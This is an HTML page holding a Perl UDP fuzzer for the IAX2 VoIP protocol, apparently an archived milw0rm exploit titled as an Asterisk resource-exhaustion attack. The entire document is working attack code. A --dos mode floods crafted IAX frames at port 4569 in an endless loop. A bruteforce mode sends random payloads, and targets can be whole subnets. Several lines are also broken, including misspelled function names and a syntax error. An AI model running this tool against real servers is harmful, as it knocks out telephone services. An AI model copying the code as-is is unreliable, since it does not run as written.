<html><head><title>Asterisk IAX2 Resource Exhaustion via Attacked IAX Fuzzer</title></head><pre>#!/usr/bin/perl -w
#udp IAX protocol fuzzer
#Created: Blake Cornell
# Exploits found with this code can be
#  found at
#	http://www.securityscraper.com/
#Released under the VoIPER project
#
# Do not hesitate to show enthusiasm and support
#       and help develop this further.

use strict;
use IO::Socket;
use Getopt::Long;
use Net::Subnets;
use Pod::Usage;

my @target_port = (4569);
my @targets = ('127.0.0.1');
my $result = GetOptions('port|p=i' =&gt; \(my $port = ''),
                        'host|h=s' =&gt; \(my $host = ''),
                        'dos' =&gt; \(my $dos = ''),
                        'bruteforce' =&gt; \(my $bruteforce = ''),
                        'timeout|t=i' =&gt; \(my $timeout = ''),
                        'dust=i' =&gt; \(my $dust = ''),
                        'listen' =&gt; \(my $listen = ''),
                        'verbose|v' =&gt; \(my $verbose = ''),
                        'help|?' =&gt; \(my $help = '')) or pod2usage(2);

if($help) { printUsage(); }
if($host) { @targets=@{retHosts($host)}; }
if($port) { $target_port[0] = $port; }
if($listen&amp;&amp;$dos) { print(&quot;DoS mode is in Listening Mode\n&quot;); }

for(my $i=0; $i&lt;=$#targets;$i++) {
	if($verbose) { print($targets[$i].&quot;\n&quot;); }
        fuzzIAX($targets[$i],4569,$timeout);
}
exit;

sub fuzzIAX {
        my($target,$port,$timeout,@args)=@_;

        if($verbose) { print(&quot;Trying $target:$port\n&quot;); }

        socket(PING, PF_INET, SOCK_DGRAM, getprotobyname(&quot;udp&quot;));

        my %iaxFrameTypes=(
			'Nan' =&gt; &quot;00&quot;,
                        'DTMF' =&gt; &quot;01&quot;,
                        'VOICE' =&gt; &quot;02&quot;,
                        'VIDEO' =&gt; &quot;03&quot;,
                        'CONTROL' =&gt; &quot;04&quot;,
                        'Null' =&gt; &quot;05&quot;,
                        'IAXCONTROL' =&gt; &quot;06&quot;,
                        'TEXT' =&gt; &quot;07&quot;,
                        'IMAGE' =&gt; &quot;08&quot;,
                        'HTML' =&gt; &quot;09&quot;,
                        'COMFORTNOISE' =&gt; &quot;0a&quot;,
                        'Unknown' =&gt; &quot;0b&quot;,
                        'Unknown' =&gt; &quot;0c&quot;,
                        'Unknown' =&gt; &quot;0d&quot;,
                        'Unknown' =&gt; &quot;0e&quot;,
                        'Unknown' =&gt; &quot;0f&quot;);

        my %iaxControls=(
			'Nan' =&gt; &quot;00&quot;,
                        'HANGUP' =&gt; &quot;01&quot;,
                        'Reserved' =&gt; &quot;02&quot;,
                        'RINGING' =&gt; &quot;03&quot;,
                        'ANSWER' =&gt; &quot;04&quot;,
                        'BUSY' =&gt; &quot;05&quot;,
                        'Reserved' =&gt; &quot;06&quot;,
                        'Reserved' =&gt; &quot;07&quot;,
                        'CONGESTION' =&gt; &quot;08&quot;,
                        'FLASH_HOOK' =&gt; &quot;09&quot;,
                        'Reserved' =&gt; &quot;0a&quot;,
                        'OPTION' =&gt; &quot;0b&quot;,
                        'KEY_RADIO' =&gt; &quot;0c&quot;,
                        'UNKEY_RADIO' =&gt; &quot;0d&quot;,
                        'CALL_PROGRESS' =&gt; &quot;0e&quot;,
                        'CALL_PROCEEDING' =&gt; &quot;0f&quot;,
                        'HOLD' =&gt; &quot;10&quot;,
                        'UNHOLD' =&gt; &quot;11&quot;);

        my %iaxControlFrames=(
			'Nan' =&gt; &quot;00&quot;,
                        'NEW' =&gt; &quot;01&quot;,
                        'PING' =&gt; &quot;02&quot;,
                        'PONG' =&gt; &quot;03&quot;,
                        'ACK' =&gt; &quot;04&quot;,
                        'HANGUP' =&gt; &quot;05&quot;,
                        'REJECT' =&gt; &quot;06&quot;,
                        'ACCEPT' =&gt; &quot;07&quot;,
                        'AUTHREQ' =&gt; &quot;08&quot;,
                        'AUTHREP' =&gt; &quot;09&quot;,
                        'INVAL' =&gt; &quot;0a&quot;,
                        'LAGRQ' =&gt; &quot;0b&quot;,
                        'LAGRP' =&gt; &quot;0c&quot;,
                        'REGREQ' =&gt; &quot;0d&quot;,
                        'REGAUTH' =&gt; &quot;0e&quot;,
                        'REGACK' =&gt; &quot;0f&quot;,
                        'REGREJ' =&gt; &quot;10&quot;,
                        'REGREL' =&gt; &quot;11&quot;,
                        'VNACK' =&gt; &quot;12&quot;,
                        'DPREQ' =&gt; &quot;13&quot;,
                        'DPREP' =&gt; &quot;14&quot;,
                        'DIAL' =&gt; &quot;15&quot;,
                        'TXREQ' =&gt; &quot;16&quot;,
                        'TXCNT' =&gt; &quot;17&quot;,
                        'TXACC' =&gt; &quot;18&quot;,
                        'TXREADY' =&gt; &quot;19&quot;,
                        'TXREL' =&gt; &quot;1a&quot;,
                        'TXREJ' =&gt; &quot;1b&quot;,
                        'QUELCH' =&gt; &quot;1c&quot;,
                        'UNQUELCH' =&gt; &quot;1d&quot;,
                        'POKE' =&gt; &quot;1e&quot;,
                        'Reserved' =&gt; &quot;1f&quot;,
                        'MWI' =&gt; &quot;20&quot;,
                        'UNSUPPORT' =&gt; &quot;21&quot;,
                        'TRANSFER' =&gt; &quot;22&quot;,
                        'Reserved' =&gt; &quot;23&quot;,
                        'Reserved' =&gt; &quot;24&quot;,
                        'Reserved' =&gt; &quot;25&quot;);

        my %iaxHTML = (
                        'SEND_URL' =&gt; 1,
                        'DATA_FRAME' =&gt; 2,
                        'BEGINNING_FRAME' =&gt; 4,
                        'END_FRAME' =&gt; 8,
                        'LOAD_COMPLETE' =&gt; 16,
                        'PEER_NO_HTML' =&gt; 17,
                        'LINK_URL' =&gt; 18,
                        'UNLINK_URL' =&gt; 19,
                        'REJECT_LINK_URL' =&gt; 20);

        my %iaxIE = (
                        'CALLED_NUMBER' =&gt; &quot;01&quot;,
                        'CALLING_NUMBER' =&gt; &quot;02&quot;,
                        'CALLING_ANI' =&gt; &quot;03&quot;,
                        'CALLING_NAME' =&gt; &quot;04&quot;,
                        'CALLED_CONTEXT' =&gt; &quot;05&quot;,
                        'USERNAME' =&gt; &quot;06&quot;,
                        'PASSWORD' =&gt; &quot;07&quot;,
                        'CAPABILITY' =&gt; &quot;08&quot;,
                        'FORMAT' =&gt; &quot;09&quot;,
                        'LANGUAGE' =&gt; &quot;0a&quot;,
                        'VERSION' =&gt; &quot;0b&quot;,
                        'ADSPICE' =&gt; &quot;0c&quot;,
                        'DNID' =&gt; &quot;0d&quot;,
                        'AUTHMETHODS' =&gt; &quot;0e&quot;,
                        'CHALLENGE' =&gt; &quot;0f&quot;,
                        'MD5_RESULT' =&gt; &quot;10&quot;,
                        'RSA_RESULT' =&gt; &quot;11&quot;,
                        'APPARENT_ADDR' =&gt; &quot;12&quot;,
                        'REFRESH' =&gt; &quot;13&quot;,
                        'DPSTATUS' =&gt; &quot;14&quot;,
                        'CALLNO' =&gt; &quot;15&quot;,
                        'CAUSE' =&gt; &quot;16&quot;,
                        'IAX_UNKNOWN' =&gt; &quot;17&quot;,
                        'MSGCOUNT' =&gt; &quot;18&quot;,
                        'AUTOANSWER' =&gt; &quot;19&quot;,
                        'MUSICONHOLD' =&gt; &quot;1a&quot;,
                        'TRANSFERID' =&gt; &quot;1b&quot;,
                        'RDNIS' =&gt; &quot;1c&quot;,
                        'Reserved' =&gt; &quot;1d&quot;,
                        'Reserved' =&gt; &quot;1e&quot;,
                        'DATETIME' =&gt; &quot;1f&quot;,
                        'Reserved' =&gt; &quot;20&quot;,
                        'Reserved' =&gt; &quot;21&quot;,
                        'Reserved' =&gt; &quot;22&quot;,
                        'Reserved' =&gt; &quot;23&quot;,
                        'Reserved' =&gt; &quot;24&quot;,
                        'Reserved' =&gt; &quot;25&quot;,
                        'CALLINGPRES' =&gt; &quot;26&quot;,
                        'CALLINGTON' =&gt; &quot;27&quot;,
                        'CALLINGTNS' =&gt; &quot;28&quot;,
                        'SAMPLINGRATE' =&gt; &quot;29&quot;,
                        'CAUSECODE' =&gt; &quot;2a&quot;,
                        'ENCRYPTION' =&gt; &quot;2b&quot;,
                        'ENCKEY' =&gt; &quot;2c&quot;,
                        'CODEC_PREFS' =&gt; &quot;2d&quot;,
                        'RR_JITTER' =&gt; &quot;2e&quot;,
                        'RR_LOSS' =&gt; &quot;2f&quot;,
                        'RR_PKTS' =&gt; &quot;30&quot;,
                        'RR_DELAY' =&gt; &quot;31&quot;,
                        'RR_DROPPED' =&gt; &quot;32&quot;,
                        'RR_000' =&gt; &quot;33&quot;);

        my %iaxDTMF = (
                        '0' =&gt; 0,
                        '1' =&gt; 1,
                        '2' =&gt; 2,
                        '3' =&gt; 3,
                        '4' =&gt; 4,
                        '5' =&gt; 5,
                        '6' =&gt; 6,
                        '7' =&gt; 7,
                        '8' =&gt; 8,
                        '9' =&gt; 9,
                        '*' =&gt; 10,
                        '#' =&gt; 11,
                        'A' =&gt; 12,
                        'B' =&gt; 13,
                        'C' =&gt; 14,
                        'D' =&gt; 15);

        my $MAXLEN = 1024;
        my $TIMEOUT = 1;
        if(defined($timeout) &amp;&amp; $timeout ne '' &amp;&amp; $timeout != 0) { #timeout of 0 hangs
                                                                #unanswered requests
                $TIMEOUT=$timeout;
        }

        if($dos) {
                if($verbose) { print(&quot;Dos attempts initiated\n&quot;); }

                my $src_call = &quot;8000&quot;;
                my $dst_call = &quot;0000&quot;;
                my $timestamp = &quot;00000000&quot;;

			#use rand sequence information to line up RE issues.
                my $outbound_seq = unpack(&quot;H2&quot;,pack(&quot;H2&quot;,int(rand(256))));
                my $inbound_seq = unpack(&quot;H2&quot;,pack(&quot;H2&quot;,int(rand(256))));
			#or not
                #my $outbound_seq = &quot;00&quot;;
                #my $inbound_seq = &quot;00&quot;;

		for(my $i=1; 1==1; $i++) {
			foreach my $frame (keys(%iaxFrameTypes)) {
			  foreach my $subset (keys(%iaxControlFrames)) {
			    foreach my $ie (keys(%iaxIE)) {
                                my $out_msg =   $src_call . 
						$dst_call . 
						$timestamp . 
						$outbound_seq . 
						$inbound_seq . 
						$iaxFrameTypes{$frame} . 
						$iaxControlFrames{$subset} . 
						$iaxIE{$ie};
                                if(my @args = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,$listen,0)) {
                                        if($verbose &amp;&amp; $i%1==0) {
                                                print('['.scalar(localtime).'] ');
                                                print($frame.' '.$subset.' '.$ie.&quot;\n&quot;);
                                        }
                                }
			    }
			  }
                        }
			print &quot;Looping\n&quot;;
                }
        }elsif($bruteforce) {
                while(1) {
                        bruteForceFUZZ($target,$port,$listen,$timeout,\%iaxFrameTypes,\%iaxControlFrames,\%iaxIE);
                        print(&quot;\t\tLooping\n\n&quot;);
                        sleep(5);
                }
        }else{ ###smart fuzz

        my $src_call = &quot;8000&quot;;
        my $dst_call = &quot;0000&quot;;
        my $timestamp = &quot;00000000&quot;;
        my $outbound_seq = &quot;00&quot;;
        my $inbound_seq = &quot;00&quot;;

foreach my $frameType (keys(%iaxFrameTypes)) {
    if($frameType eq 'CONTROL') {
        foreach my $controlKey (keys(%iaxControls)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControls{$controlKey} . $iaxIE{$ieKey}.&quot;00&quot;;
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
                        if(defined($recv[0]) &amp;&amp; defined($recv[1])) {
                        	print('['.scalar(localtime).'] ');
                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$controlKey.&quot; &quot;.$ieKey.&quot;\n&quot;);
			}
			if(defined($recv[2]) &amp;&amp; defined($out_msg) &amp;&amp; length($recv[2]) &gt; length($out_msg)) {
                               	print(length($recv[2])-length($out_msg).&quot; bytes difference\n&quot;);
                               	print($out_msg.' '.$recv[2].&quot;\n&quot;);
                        }
                }
            }
        }

    }elsif($frameType eq 'IAXCONTROL') {
        foreach my $frameKey (keys(%iaxControlFrames)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ieKey}.'00';
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
                        if(defined($recv[0]) &amp;&amp; defined($recv[1])) {
                        	logAngPrint('['.scalar(localtime).'] ');
                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$frameKey.&quot; &quot;.$ieKey.' ');
			}
			if(defined($recv[2]) &amp;&amp; defined($out_msg) &amp;&amp; length($recv[2]) &gt; length($out_msg)) {
                               	print(length($recv[2])-length($out_msg).&quot; bytes difference\n&quot;);
                               	print($out_msg.' '.$recv[2].&quot;\n&quot;);
                        }
                }
            }
        }
    }elsif($frameType eq 'HTML') {
        foreach my $htmlKey (keys(%iaxHTML)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxHTML{$htmlKey} . $iaxIE{$ieKey}.'00';
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
                        if(defined($recv[0]) &amp;&amp; defined($recv[1])) {
                        	print('['.scalar(localtime).'] ');
                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$htmlKey.&quot; &quot;.$ieKey.' ');
			}
			if(defined($recv[2]) &amp;&amp; defined($out_msg) &amp;&amp; length($recv[2]) &gt; length($out_msg)) {
                               	print(length($recv[2])-length($out_msg).&quot; bytes difference\n&quot;);
                               	print($out_msg.' '.$recv[2].&quot;\n&quot;);
                        }
                }
            }
        }

    }elsif($frameType eq 'DTMF') {
        foreach my $dtmfKey (keys(%iaxDTMF)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxDTMF{$dtmfKey} . $iaxIE{$ieKey}.'00';
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
			if(defined($recv[0]) &amp;&amp; defied($recv[2])) {
                        	print('['.scalar(localtime).'] ');
                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$dtmfKey.&quot; &quot;.$ieKey.' ');
			}
           		if(defined($recv[2]) &amp;&amp; defined($out_msg) &amp;&amp; length($recv[2]) &gt; length($out_msg)) {
                               	print(length($recv[2])-length($out_msg).&quot; bytes difference\n&quot;);
                               	print($out_msg.' '.$recv[2].&quot;\n&quot;);
                        }
                }
            }
        }
    }elsif($frameType eq 'TEXT') {
        my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . &quot;00&quot;; #text frame types &quot;must&quot; have a subclass of 0?
        if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
		if(defined($recv[0]) &amp;&amp; defined($recv[1])) {
          		print('['.scalar(localtime).'] ');
               		print($recv[0].' '.$recv[1].' '.$frameType.' 00 ');
		}
	        if(defined($recv[2]) &amp;&amp; defined($out_msg) &amp;&amp; length($recv[2]) &gt; length($out_msg)) {
	        	print(length($recv[2])-length($out_msg).&quot; bytes difference\n&quot;);
	                print($out_msg.' '.$recv[2].&quot;\n&quot;);
		}
        }
    }else{
        foreach my $frameKey (keys(%iaxControlFrames)) {
            foreach my $ieKey (keys(%iaxIE)) {
                my $out_msg = $src_call . $dst_call . $timestamp . $outbound_seq . $inbound_seq . $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ieKey}.'00';
                if(my @recv = sendUDPSocket($out_msg,$target,$port,$TIMEOUT,1)) {
			if(defined($recv[0]) &amp;&amp; defined($recv[1])) {
                        	print('['.scalar(localtime).'] ');
                        	print($recv[0].' '.$recv[1].' '.$frameType.' '.$frameKey.&quot; &quot;.$ieKey.' ');
			}
                        if(defined($recv[2]) &amp;&amp; defined($out_msg) &amp;&amp; length($recv[2]) &gt; length($out_msg)) {
                                print(length($recv[2])-length($out_msg).&quot; bytes difference\n&quot;);
                                print($out_msg.' '.$recv[2].&quot;\n&quot;);
                        }
                }
            }
        }
      }
    }
  }
}

sub sendUDPSocket {
        my($msg,$target,$port,$timeout,$listen,@args)=@_;

        my $MAXLEN=1024;

                #my($respaddr,$port);
                my $out_msg = pack(&quot;H*&quot;,$msg);
                my $ipaddr = inet_aton($target);
                my $sin = sockaddr_in($port,$ipaddr);
                send(PING, $out_msg, 0, $sin) == length($out_msg) or die &quot;cannot send to $target : $port : $!\n&quot;;

        if($listen) {
		#sleep(.005);
                eval {
                        local $SIG{ALRM} = sub { die &quot;alarm time out&quot;; };
                        alarm $timeout;
                        #alarm $timeout;
                        while (1) {
                                my $recvfrom = recv(PING, my $in_msg, $MAXLEN, 0) or die &quot;recv: $!&quot;;
                                ($port, $ipaddr) = sockaddr_in($recvfrom);
                                my $respaddr = inet_ntoa($ipaddr);
                                if($verbose) {
					displayIAXRaw($respaddr,$port,$respaddr,$out_msg,$in_msg);
                                }
                                return($respaddr,$port,unpack(&quot;H*&quot;,$in_msg));
                        }
                };
                return 0;
        }
}

sub bruteForceFUZZ {
        my($target,$port,$listen,$timeout,$refFrameTypes,$refControlFrames,$refIE,@args)=@_;

                my %iaxFrameTypes=%{$refFrameTypes};
                my %iaxControlFrames=%{$refControlFrames};
                my %iaxIE=%{$refIE};

                for(my $a=32768;$a&lt;=32768;$a++) {# Full Packet 4byte
                 for(my $b=0;$b&lt;=0;$b++) {# Dest Call 4byte
                  for(my $c=0;$c&lt;=0;$c++) {# Timestamp 8byte
                   #for(my $d=0;$d&lt;=0;$d++) {# Out Seq # 2byte
		   my $loopD=1;
                   #for(my $d=unpack(&quot;H2&quot;,pack(&quot;H2&quot;,int(rand(256))));$loopD;$d++) {# Out Seq # 2byte
		   #	$loopD=0;

                my $outbound_seq = unpack(&quot;H2&quot;,pack(&quot;H2&quot;,int(rand(256))));
                my $inbound_seq = unpack(&quot;H2&quot;,pack(&quot;H2&quot;,int(rand(256))));


                    #if($verbose) {print(sprintf(&quot;%04x&quot;,$a).&quot; &quot;.sprintf(&quot;%04x&quot;,$b).&quot; &quot;.sprintf(&quot;%08x&quot;,$c).&quot; &quot;.sprintf(&quot;%02x&quot;,$d).&quot;\n&quot;); }
		    for(my $d=0;1;$d++) {
                     for(my $e=0;1;$e++) {# In Seq # 2byte
                      foreach my $frameType (keys(%iaxFrameTypes)) {
                       foreach my $frameKey (keys(%iaxControlFrames)) {
                        foreach my $ie (keys(%iaxIE)) {
                         for(my $f=0;$f&lt;=0;$f++) {
			  my $maxDust=10;
			  if($listen) { $maxDust/=2; }
			  if(defined($dust) &amp;&amp; length($dust) &gt; 0) { $maxDust=$dust; }
                          for(my $z=1;$z&lt;=$maxDust;$z++) {
			    my $len = int(rand(9));
			    my $box= int(rand(&quot;9&quot;x(($len+1))));
			      for(my $zz=1;$zz&lt;=$maxDust;$zz++) {	
				my $hex_msg = sprintf(&quot;%04x&quot;,$a).sprintf(&quot;%04x&quot;,$b).sprintf(&quot;%08x&quot;,$c).sprintf(&quot;%02x&quot;,$d).sprintf(&quot;%02x&quot;,$e). $iaxFrameTypes{$frameType} . $iaxControlFrames{$frameKey} . $iaxIE{$ie} . sprintf(&quot;%02x&quot;,$f) . sprintf(&quot;%0&quot;.$len.&quot;x&quot;,$box);
                                if($verbose) {print(&quot;[&quot; . scalar(localtime) . &quot;] '&quot; . $frameType.&quot;_&quot;.$frameKey.&quot;_&quot;.$ie.&quot;_&quot;.sprintf(&quot;%02x&quot;,$f).&quot;_&quot;.sprintf(&quot;%0&quot;.$len.&quot;x&quot;,$box).&quot;'\n&quot;); }
				foreach my $var (sendUDPSocket($hex_msg,$target,$port,1,$listen)) { if($verbose) { print($var.&quot;_&quot;); } }
			      }
		}}}}}}}}}}  #&lt;------ VERY IMPORTANT
}

sub retIAXHostActive {
        my($target,$port,@args)=@_;
        my $out_msg='';
        if(my @recv = sendUDPSocket($out_msg,$target,$port,1,1)) {
                return 1;
        }
        return 0;
}

sub retHosts {
        my($host,@args)=@_;
        my @addrs;

        if(!$host) { return ('127.0.0.1') };

        if($host =~ /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})\/([\d]{1,2})$/ &amp;&amp; $1 &gt;= 0 &amp;&amp; $1 &lt;= 255 &amp;&amp; $2 &gt;= 0 &amp;&amp; $2 &lt;= 255 &amp;&amp; $3 &gt;= 0 &amp;&amp; $3 &lt;= 255 &amp;&amp; $4 &gt;= 0 &amp;&amp; $4 &lt;= 255) {
                                        #Check to see if host is valid class C CIDR Address
                if($verbose) { print(&quot;Setting CIDR Address Range\n&quot;); }
                my $sn = Net::Subnets-&gt;new;

                my($low,$high)=$sn-&gt;range(\$host);
                if($verbose) { print(&quot;Determined IP Ranges From $$low - $$high\n&quot;); }
                return \@{ $sn-&gt;list(\($$low,$$high)) };
        }elsif($host =~ /^([\d]{1,3}).([\d]{1,3}).([\d]{1,3}).([\d]{1,3})$/ &amp;&amp; $1 &gt;= 0 &amp;&amp; $1 &lt;= 255 &amp;&amp; $2 &gt;= 0 &amp;&amp; $2 &lt;= 255 &amp;&amp; $3 &gt;= 0 &amp;&amp; $3 &lt;= 255 &amp;&amp; $4 &gt;= 0 &amp;&amp; $4 &lt;= 255)  {
                                        #Check to see if host is valid IP
                push(@addrs,&quot;$1.$2.$3.$4&quot;);
        }else{
                push(@addrs,$host);
        }
        return \@addrs;
}

sub displayIAXRaw {
	my($respaddr,$port,$out_msg,$in_msg)=@_;

	if(defined($in_msg) &amp;&amp; unpack(&quot;H*&quot;,$in_msg) ne '80000000000000000000060a') {
	        print(&quot;[&quot; . scalar(localtime) . &quot;] $respaddr:$port\t$respaddr\t&quot; . unpack(&quot;H*&quot;,$out_msg) . &quot;\t&quot;. unpack(&quot;H*&quot;,$in_msg) . &quot;\n&quot;);
	}elsif(defined($respaddr) &amp;&amp; defined($port)) {
	        print(scalar(localtime) . &quot; $respaddr:$port\t$respaddr\n&quot;);

	}
}

sub displayIAXPacket {
        my($hex_msg,@args)=@_;

        my $width=32/8;

        for(my $i=0;$i*$width&lt;=length($hex_msg);$i++) {
                print(substr($hex_msg,$i*$width,$width).&quot;\n&quot;);
        }
        #print $hex_msg.&quot;\n&quot;;
}

sub printUsage {
        print &quot;$0 --dos\n\t\tWill loop through known or manually preset packet combinations.\n&quot;;
        print &quot;$0 --bruteforce\n\t\tBrute force fuzzes on default port of 4569.  It will try random data packaging at the end of a valid packet.  It will by default send 10 per each packet.\n&quot;;
        print &quot;$0 -h 127.0.0.1 --bruteforce --dust 1\n\t\tBrute force fuzzes on default port of 4569.  It will try random data packaging at the end of a valid packet.  It will only send 1 of each packet.\n&quot;;
        print &quot;$0 \n\t\tScans the loopback interface by rough usage from IETF guidelines.\n&quot;;
        exit;
}

sub logAndPrint {
	my($string,@args)=@);
	
	if(1==1 || defined($string)) {
		print $string;
		open(FLE,&quot;&gt;&gt;$0_logs_[&quot;.scalar(localtime).&quot;] $string&quot;);
		print FLE $string;
		close(FLE);
	}
}

# milw0rm.com [2009-06-12]</pre></html>